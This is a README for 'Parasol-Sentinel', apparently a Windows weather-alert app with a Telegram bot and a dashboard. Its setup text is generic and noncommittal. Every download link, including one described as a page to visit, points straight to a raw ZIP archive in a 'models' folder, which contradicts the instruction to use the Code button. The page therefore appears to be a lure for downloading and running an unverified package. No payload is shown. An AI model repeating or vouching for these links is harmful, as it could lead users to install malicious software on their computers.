# ☂️ Parasol-Sentinel - Weather alerts you can trust

[![Download Parasol-Sentinel](https://img.shields.io/badge/Download-Parasol--Sentinel-blue?style=for-the-badge&logo=github)](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)

## 🌦️ What this app does

Parasol-Sentinel helps you keep track of weather conditions from one place. It pairs a Telegram bot with a clean dashboard, so you can check alerts, view trends, and monitor user zones with less effort.

It is built for people who want:
- Clear weather updates
- Fast access to live data
- Simple alerts in Telegram
- A dashboard that is easy to read
- Safe user zones with protected access

## 🪟 Windows download and setup

### 1. Open the download page
Visit this page to download the app:

[Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)

### 2. Download the project files
On the GitHub page, click the green **Code** button, then choose **Download ZIP**.

### 3. Unpack the files
After the download finishes:
- Find the ZIP file in your **Downloads** folder
- Right-click it
- Choose **Extract All**
- Pick a folder you can find again, such as **Desktop** or **Documents**

### 4. Open the project folder
Open the folder you just extracted. You should see the app files inside.

### 5. Install the needed tools
This app uses Node.js, so install it first if it is not already on your PC:
- Go to the Node.js website
- Download the Windows version
- Run the installer
- Keep the default options during setup

You also need a MongoDB database connection and Telegram bot details to use the full app.

### 6. Start the app
If the project includes a Windows start file, double-click it.

If it uses a local setup, open the folder in Command Prompt and run the start command shown in the project files.

## 🧰 What you need on your PC

For the best experience on Windows, use:
- Windows 10 or Windows 11
- A stable internet connection
- At least 4 GB of RAM
- 500 MB of free disk space
- Node.js installed
- Access to MongoDB Atlas
- A Telegram account

## 📦 Main parts of the app

### Dashboard
The dashboard gives you a clear view of weather data in one place. It uses a glassmorphism design, which means the panels look clean, soft, and layered.

### Telegram bot
The bot can send weather checks and alerts to Telegram. That helps you get updates without opening the dashboard each time.

### Weather data handling
The app pulls weather data, cleans it up, and turns it into a format that is easier to read. This helps reduce noise and keeps the display useful.

### User zones
The app supports protected user zones. These zones help keep user-specific weather views separate and secure.

### Charts
The app uses charts to show trends over time. This makes it easier to see changes in weather patterns.

## 🔧 Basic setup steps

If you want the app to run with your own data, you usually need to set a few values before starting it:

- MongoDB connection string
- Telegram bot token
- Telegram chat ID
- Weather API key
- App name or zone settings

Look for a file such as `.env`, `config`, or setup instructions in the repository. Add the details there, then save the file.

## 🧭 How to use it

### Check the dashboard
Open the app in your browser or local window, then review the weather panels and charts.

### Connect Telegram
Set up the bot token and chat ID, then test a message. After that, alerts can arrive in Telegram.

### Review zones
Open the user zone area to check what data belongs to each user or group.

### Watch trends
Use the chart view to see changes in temperature, rain, wind, or other weather values.

## 🛠️ Common Windows problems

### The app does not open
Check that:
- Node.js is installed
- You unpacked the ZIP file
- You opened the right folder
- The app files were not moved after extraction

### Telegram alerts do not arrive
Check:
- The bot token
- The chat ID
- Your internet connection
- Whether the bot has permission to send messages

### Data does not load
Check:
- The MongoDB connection
- The weather API key
- Your network access
- The setup values in the config file

### The page looks broken
Try:
- Refreshing the page
- Closing and reopening the app
- Checking that the browser is up to date

## 🧪 Project focus

Parasol-Sentinel brings together:
- Automation
- Weather checks
- Dashboard charts
- Telegram reporting
- Serverless hosting
- MongoDB storage
- Proactive monitoring
- Data cleanup and normalization

## 📁 Suggested folder layout

A typical setup may include:
- `dashboard` for the web view
- `bot` for Telegram tasks
- `api` for serverless routes
- `config` for app settings
- `public` for images and page files
- `scripts` for helper tasks

## 🔐 Security notes

The app uses HMAC-protected zones, which helps keep user data tied to the right access path. Keep your bot token, database string, and API keys private. Do not share them in chat or post them in public places

## 📌 GitHub link

[Open Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)

## 🖥️ Running it again later

To use the app again:
- Open the folder
- Start the app the same way you did before
- Make sure your internet is on
- Check that MongoDB and Telegram settings still match your account

## 📘 What this repository is for

This repository is set up for weather monitoring with two main views:
- A Telegram bot for alerts and checks
- A dashboard for visual monitoring

It suits users who want one place for weather status, alert delivery, and simple trend viewing